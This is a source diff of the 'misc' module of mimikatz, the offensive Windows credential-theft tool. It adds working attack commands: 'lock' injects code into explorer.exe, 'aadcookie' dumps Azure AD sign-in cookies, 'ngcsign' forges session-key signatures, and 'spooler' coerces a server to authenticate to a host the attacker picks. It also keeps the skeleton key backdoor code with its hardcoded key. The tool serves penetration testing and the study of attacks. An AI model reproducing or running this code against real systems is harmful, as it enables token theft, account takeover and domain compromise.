@@ -1,5 +1,5 @@
 /*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
+	https://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
@@ -18,11 +18,16 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 //#endif
 	{kuhl_m_misc_memssp,	L"memssp",		NULL},
 	{kuhl_m_misc_skeleton,	L"skeleton",	NULL},
-	{kuhl_m_misc_compressme,L"compressme",	NULL},
-	{kuhl_m_misc_wp,		L"wp",	NULL},
-	{kuhl_m_misc_mflt,		L"mflt",	NULL},
+	{kuhl_m_misc_compress,	L"compress",	NULL},
+	{kuhl_m_misc_lock,		L"lock",		NULL},
+	{kuhl_m_misc_wp,		L"wp",			NULL},
+	{kuhl_m_misc_mflt,		L"mflt",		NULL},
 	{kuhl_m_misc_easyntlmchall,	L"easyntlmchall", NULL},
-	{kuhl_m_misc_clip,		L"clip", NULL},
+	{kuhl_m_misc_clip,		L"clip",		NULL},
+	{kuhl_m_misc_xor,		L"xor",			NULL},
+	{kuhl_m_misc_aadcookie,	L"aadcookie",	NULL},
+	{kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey,	L"ngcsign",	NULL},
+	{kuhl_m_misc_spooler,	L"spooler",		NULL},
 };
 const KUHL_M kuhl_m_misc = {
 	L"misc",	L"Miscellaneous module",	NULL,
@@ -599,7 +604,7 @@ NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init(LPCVOID Key, DWORD KeySize, DWORD Ke
 {
 	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
 	PVOID origContext, kiwiContext;
-	DWORD kiwiKey[] = {0Xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
+	DWORD kiwiKey[] = {0xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
 	if(*pContext = ((PLOCALALLOC) 0x4a4a4a4a4a4a4a4a)(0, 32 + sizeof(PVOID)))
 	{
 		status = ((PKERB_ECRYPT_INITIALIZE) 0x4343434343434343)(Key, KeySize, KeyUsage, &origContext);
@@ -626,7 +631,7 @@ NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init(LPCVOID Key, DWORD KeySize, DWORD Ke
 NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init_decrypt(PVOID pContext, LPCVOID Data, DWORD DataSize, PVOID Output, DWORD * OutputSize)
 {
 	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
-	DWORD origOutputSize = *OutputSize, kiwiKey[] = {0Xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
+	DWORD origOutputSize = *OutputSize, kiwiKey[] = {0xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
 	PVOID buffer;
 	if(buffer = ((PLOCALALLOC) 0x4a4a4a4a4a4a4a4a)(0, DataSize))
 	{
@@ -740,30 +745,114 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-#define MIMIKATZ_COMPRESSED_FILENAME	MIMIKATZ L"_" MIMIKATZ_ARCH L".compressed"
-NTSTATUS kuhl_m_misc_compressme(int argc, wchar_t * argv[])
+NTSTATUS kuhl_m_misc_compress(int argc, wchar_t * argv[])
 {
-	PBYTE data, compressedData;
-	DWORD size, compressedSize;
+	LPCWSTR szInput, szOutput;
+	PVOID pInput, pOutput;
+	DWORD dwInput, dwOutput;
 #pragma warning(push)
 #pragma warning(disable:4996)
-	wchar_t *fileName = _wpgmptr;
+	if(kull_m_string_args_byName(argc, argv, L"input", &szInput, _wpgmptr))
 #pragma warning(pop)
-	kprintf(L"Using \'%s\' as input file\n", fileName);
-	if(kull_m_file_readData(fileName, &data, &size))
 	{
-		kprintf(L" * Original size  : %u\n", size);
-		if(kull_m_memory_quick_compress(data, size, (PVOID *) &compressedData, &compressedSize))
+		if(kull_m_string_args_byName(argc, argv, L"output", &szOutput, MIMIKATZ L"_" MIMIKATZ_ARCH L".compressed"))
 		{
-			kprintf(L" * Compressed size: %u (%.2f%%)\nUsing \'%s\' as output file... ", compressedSize, 100 * ((float) compressedSize / (float) size), MIMIKATZ_COMPRESSED_FILENAME);
-			if(kull_m_file_writeData(MIMIKATZ_COMPRESSED_FILENAME, compressedData, compressedSize))
-				kprintf(L"OK!\n");
-			else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
-			LocalFree(compressedData);
+			kprintf(L"Input : %s\nOutput: %s\n\nOpening: ", szInput, szOutput);
+			if(kull_m_file_readData(szInput, (PBYTE *) &pInput, &dwInput))
+			{
+				kprintf(L"OK\n");
+				kprintf(L" * Original size  : %u\n", dwInput);
+				if(kull_m_memory_quick_compress(pInput, dwInput, &pOutput, &dwOutput))
+				{
+					kprintf(L" * Compressed size: %u (%.2f%%)\n", dwOutput, 100 * ((float) dwOutput / (float) dwInput));
+					kprintf(L"Writing: ");
+					if(kull_m_file_writeData(szOutput, pOutput, dwOutput))
+						kprintf(L"OK\n");
+					else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+					LocalFree(pOutput);
+				}
+			}
+			else PRINT_ERROR_AUTO(L"kull_m_file_readData");
 		}
-		LocalFree(data);
+		else PRINT_ERROR(L"An /output:file is needed\n");
 	}
+	else PRINT_ERROR(L"An /input:file is needed\n");
 	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_misc_lock(int argc, wchar_t * argv[])
+{
+	PCWCHAR process;
+	UNICODE_STRING uProcess;
+	kull_m_string_args_byName(argc, argv, L"process", &process, L"explorer.exe");
+	RtlInitUnicodeString(&uProcess, process);
+	kprintf(L"Proxy process : %wZ\n", &uProcess);
+	kull_m_process_getProcessInformation(kuhl_m_misc_lock_callback, &uProcess);
+	return STATUS_SUCCESS;
+}
+
+BOOL CALLBACK kuhl_m_misc_lock_callback(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg)
+{
+	DWORD pid;
+	if(RtlEqualUnicodeString(&pSystemProcessInformation->ImageName, &((PKIWI_WP_DATA) pvArg)->process, TRUE))
+	{
+		pid = PtrToUlong(pSystemProcessInformation->UniqueProcessId);
+		kprintf(L"> Found %wZ with PID %u : ", &pSystemProcessInformation->ImageName, pid);
+		kuhl_m_misc_lock_for_pid(pid, ((PKIWI_WP_DATA) pvArg)->wp);
+	}
+	return TRUE;
+}
+
+#pragma optimize("", off)
+DWORD WINAPI kuhl_m_misc_lock_thread(PREMOTE_LIB_DATA lpParameter)
+{
+	lpParameter->output.outputStatus = STATUS_SUCCESS;
+	if(!((PLOCKWORKSTATION) 0x4141414141414141)())
+		lpParameter->output.outputStatus = ((PGETLASTERROR) 0x4242424242424242)();
+	return STATUS_SUCCESS;
+}
+DWORD kuhl_m_misc_lock_thread_end(){return 'stlo';}
+#pragma optimize("", on)
+
+void kuhl_m_misc_lock_for_pid(DWORD pid, PCWCHAR wp)
+{
+	REMOTE_EXT extensions[] = {
+		{L"user32.dll",		"LockWorkStation",	(PVOID) 0x4141414141414141, NULL},
+		{L"kernel32.dll",	"GetLastError",		(PVOID) 0x4242424242424242, NULL},
+	};
+	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
+	HANDLE hProcess;
+	PKULL_M_MEMORY_HANDLE hMemory = NULL;
+	KULL_M_MEMORY_ADDRESS aRemoteFunc;
+	PREMOTE_LIB_INPUT_DATA iData;
+	REMOTE_LIB_OUTPUT_DATA oData;
+	
+	if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, pid))
+	{
+		if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hMemory))
+		{
+			if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(hMemory, kuhl_m_misc_lock_thread, (DWORD) ((PBYTE) kuhl_m_misc_lock_thread_end - (PBYTE) kuhl_m_misc_lock_thread), &extForCb, &aRemoteFunc))
+			{
+				if(iData = kull_m_remotelib_CreateInput(NULL, 0, 0, NULL))
+				{
+					if(kull_m_remotelib_create(&aRemoteFunc, iData, &oData))
+					{
+						if(oData.outputStatus)
+							kprintf(L"error %u\n", oData.outputStatus);
+						else
+							kprintf(L"OK!\n");
+					}
+					else PRINT_ERROR_AUTO(L"kull_m_remotelib_create");
+					LocalFree(iData);
+				}
+				kull_m_memory_free(&aRemoteFunc);
+			}
+			else PRINT_ERROR(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace\n");
+			kull_m_memory_close(hMemory);
+		}
+		CloseHandle(hProcess);
+	}
+	else PRINT_ERROR_AUTO(L"OpenProcess");
 }
 
 NTSTATUS kuhl_m_misc_wp(int argc, wchar_t * argv[])
@@ -1110,4 +1199,203 @@ LRESULT APIENTRY kuhl_m_misc_clip_MainWndProc(HWND hwnd, UINT uMsg, WPARAM wPara
 		result = DefWindowProc(hwnd, uMsg, wParam, lParam);
 	}
 	return result;
+}
+
+NTSTATUS kuhl_m_misc_xor(int argc, wchar_t * argv[])
+{
+	BYTE bXor = 0x42;
+	LPCWSTR szInput, szOutput, szXor;
+	PBYTE data;
+	DWORD dwData, i;
+
+	if(kull_m_string_args_byName(argc, argv, L"input", &szInput, NULL))
+	{
+		if(kull_m_string_args_byName(argc, argv, L"output", &szOutput, NULL))
+		{
+			if(kull_m_string_args_byName(argc, argv, L"xor", &szXor, NULL))
+				bXor = (BYTE) wcstoul(szXor, NULL, 0);
+
+			kprintf(L"Input : %s\nOutput: %s\nXor   : 0x%02x\n\nOpening: ", szInput, szOutput, bXor);
+			if(kull_m_file_readData(szInput, &data, &dwData))
+			{
+				kprintf(L"OK\nWriting: ");
+				for(i = 0; i < dwData; i++)
+					data[i] ^= bXor;
+				if(kull_m_file_writeData(szOutput, data, dwData))
+					kprintf(L"OK\n");
+				else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+			}
+			else PRINT_ERROR_AUTO(L"kull_m_file_readData");
+		}
+		else PRINT_ERROR(L"An /output:file is needed\n");
+	}
+	else PRINT_ERROR(L"An /input:file is needed\n");
+	return STATUS_SUCCESS;
+}
+
+const CLSID CLSID_ProofOfPossessionCookieInfoManager = {0xa9927f85, 0xa304, 0x4390, {0x8b, 0x23, 0xa7, 0x5f, 0x1c, 0x66, 0x86, 0x00}};
+const IID IID_IProofOfPossessionCookieInfoManager = {0xcdaece56, 0x4edf, 0x43df, {0xb1, 0x13, 0x88, 0xe4, 0x55, 0x6f, 0xa1, 0xbb}};
+NTSTATUS kuhl_m_misc_aadcookie(int argc, wchar_t * argv[])
+{
+	LPCWSTR szURI;
+	IProofOfPossessionCookieInfoManager *pPOPCookieInfoManager = NULL;
+	DWORD cookieInfoCount, i;
+	ProofOfPossessionCookieInfo *cookieInfo;
+	HRESULT hr;
+
+	kull_m_string_args_byName(argc, argv, L"uri", &szURI, L"https://login.microsoftonline.com");
+	hr = CoCreateInstance(&CLSID_ProofOfPossessionCookieInfoManager, NULL, CLSCTX_INPROC_SERVER, &IID_IProofOfPossessionCookieInfoManager, (void **) &pPOPCookieInfoManager);
+	if(hr == S_OK)
+	{
+		kprintf(L"URI: %s\n\n", szURI);
+		hr = IProofOfPossessionCookieInfoManager_GetCookieInfoForUri(pPOPCookieInfoManager, szURI, &cookieInfoCount, &cookieInfo);
+		if(hr == S_OK)
+		{
+			kprintf(L"Cookie count: %2u\n----------------\n", cookieInfoCount);
+			for(i = 0; i < cookieInfoCount; i++)
+			{
+				kprintf(L"\nCookie %u\n", i);
+				kprintf(L"  name     : %s\n", cookieInfo[i].name);
+				kprintf(L"  data     : %s\n", cookieInfo[i].data);
+				kprintf(L"  flags    : 0x%08x (%u)\n", cookieInfo[i].flags, cookieInfo[i].flags);
+				kprintf(L"  p3pHeader: %s\n", cookieInfo[i].p3pHeader);
+
+				CoTaskMemFree(cookieInfo[i].name);      
+				CoTaskMemFree(cookieInfo[i].data);      
+				CoTaskMemFree(cookieInfo[i].p3pHeader); 
+			}
+			CoTaskMemFree(cookieInfo);                  
+		}
+		else PRINT_ERROR(L"GetCookieInfoForUri: 0x%08x\n", hr);
+		IProofOfPossessionCookieInfoManager_Release(pPOPCookieInfoManager);
+	}
+	else PRINT_ERROR(L"CoCreateInstance: 0x%08x\n", hr);
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey(int argc, wchar_t * argv[])
+{
+	LPCWSTR szKeyValue, szLabel, szContext, szData;
+	LPSTR sLabel = NULL, sData = NULL, sSignature64;
+	PBYTE pbKeyValue, pbContext = NULL, pbOuput;
+	DWORD cbKeyValue, cbContext, cbOutput;
+
+	if(kull_m_string_args_byName(argc, argv, L"keyvalue", &szKeyValue, NULL))
+	{
+		if(kull_m_string_quick_urlsafe_base64_to_Binary(szKeyValue, &pbKeyValue, &cbKeyValue))
+		{
+			if(cbKeyValue > (2 * sizeof(DWORD)))
+			{
+				kull_m_string_args_byName(argc, argv, L"label", &szLabel, L"AzureAD-SecureConversation");
+				sLabel = kull_m_string_unicode_to_ansi(szLabel);
+				if(kull_m_string_args_byName(argc, argv, L"context", &szContext, NULL))
+					kull_m_string_stringToHexBuffer(szContext, &pbContext, &cbContext);
+				kull_m_string_args_byName(argc, argv, L"signedinfo", &szData, MIMIKATZ);
+				sData = kull_m_string_unicode_to_ansi(szData);
+
+				if(!pbContext)
+				{
+					cbContext = 24;
+					if(pbContext = (PBYTE) LocalAlloc(LPTR, cbContext))
+						CDGenerateRandomBits(pbContext, cbContext);
+				}
+
+				kprintf(L"\nKeyValue : ");
+				kull_m_string_wprintf_hex(pbKeyValue, cbKeyValue, 0);
+				kprintf(L"\nLabel    : %S (ascii)\nContext  : ", sLabel);
+				kull_m_string_wprintf_hex(pbContext, cbContext, 0);
+				kprintf(L"\nData     : %S (ascii)\n", sData);
+
+				if(kull_m_crypto_ngc_signature_pop(pbKeyValue, cbKeyValue, (PBYTE) sLabel, lstrlenA(sLabel), pbContext, cbContext, (PBYTE) sData, lstrlenA(sData), &pbOuput, &cbOutput))
+				{
+					kprintf(L"\nSignature: ");
+					kull_m_string_wprintf_hex(pbOuput, cbOutput, 0);
+					if(kull_m_string_quick_binary_to_urlsafe_base64A(pbOuput, cbOutput, &sSignature64))
+					{
+						kprintf(L" (%S base64)", sSignature64);
+						LocalFree(sSignature64);
+					}
+					kprintf(L"\n");
+					LocalFree(pbOuput);
+				}
+
+				if(sData)
+					LocalFree(sData);
+				if(sLabel)
+					LocalFree(sLabel);
+			}
+			else PRINT_ERROR(L"Invalid KeyValue format?\n");
+			LocalFree(pbKeyValue);
+		}
+	}
+	else PRINT_ERROR(L"/keyvalue:base64 is needed\n");
+
+	return STATUS_SUCCESS;
+}
+
+handle_t hSpoolHandle = NULL;
+handle_t __RPC_USER STRING_HANDLE_bind(IN STRING_HANDLE Name) {return hSpoolHandle;}
+void __RPC_USER STRING_HANDLE_unbind(IN STRING_HANDLE Name, handle_t hSpool) {}
+NTSTATUS kuhl_m_misc_spooler(int argc, wchar_t * argv[])
+{
+	LPCWSTR szRemote, szCallbackTo;
+	LPWSTR szPathToCallback = NULL;
+	PRINTER_HANDLE hPrinter;
+	DEVMODE_CONTAINER Container = {0, NULL};
+	DWORD ret;
+
+	if(kull_m_string_args_byName(argc, argv, L"server", &szRemote, NULL) || kull_m_string_args_byName(argc, argv, L"target", &szRemote, NULL))
+	{
+		if(kull_m_string_args_byName(argc, argv, L"connect", &szCallbackTo, NULL) || kull_m_string_args_byName(argc, argv, L"callback", &szCallbackTo, NULL))
+		{
+			if(kull_m_string_sprintf(&szPathToCallback, L"\\\\%s", szCallbackTo))
+			{
+				kprintf(L"[info] %s will try to connect to %s\\IPC$\n\n", szRemote, szPathToCallback);
+				if(kull_m_rpc_createBinding(NULL, L"ncacn_np", szRemote, L"\\pipe\\spoolss", L"spooler", TRUE, RPC_C_AUTHN_DEFAULT, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hSpoolHandle, NULL))
+				{
+					RpcTryExcept
+					{
+						ret = RpcOpenPrinter(NULL, &hPrinter, NULL, &Container, GENERIC_READ);
+						if(ret == ERROR_SUCCESS)
+						{
+							ret = RpcRemoteFindFirstPrinterChangeNotification(hPrinter, PRINTER_CHANGE_ALL, PRINTER_NOTIFY_CATEGORY_ALL, szPathToCallback, 42, 0, NULL);
+							if(ret == ERROR_SUCCESS)
+							{
+								kprintf(L"Connected to the target, and notification is OK (?!)\n");
+								ret = RpcFindClosePrinterChangeNotification(hPrinter);
+								if(ret != ERROR_SUCCESS)
+								{
+									PRINT_ERROR(L"RpcFindClosePrinterChangeNotification: 0x%08x\n", ret);
+								}
+							}
+							else if(ret == ERROR_ACCESS_DENIED)
+							{
+								kprintf(L"Access is denied (can be OK)\n");
+							}
+							else PRINT_ERROR(L"RpcRemoteFindFirstPrinterChangeNotification: 0x%08x\n", ret);
+
+							ret = RpcClosePrinter(&hPrinter);
+							if(ret != ERROR_SUCCESS)
+							{
+								PRINT_ERROR(L"RpcClosePrinter: 0x%08x\n", ret);
+							}
+						}
+						else PRINT_ERROR(L"RpcOpenPrinter: 0x%08x\n", ret);
+					}
+					RpcExcept(RPC_EXCEPTION)
+						PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
+					RpcEndExcept
+
+					kull_m_rpc_deleteBinding(&hSpoolHandle);
+				}
+
+				LocalFree(szPathToCallback);
+			}
+		}
+		else PRINT_ERROR(L"missing /connect argument to specify notifications target");
+
+	}
+	else PRINT_ERROR(L"missing /server argument to specify spooler server");
+
+	return STATUS_SUCCESS;
 }
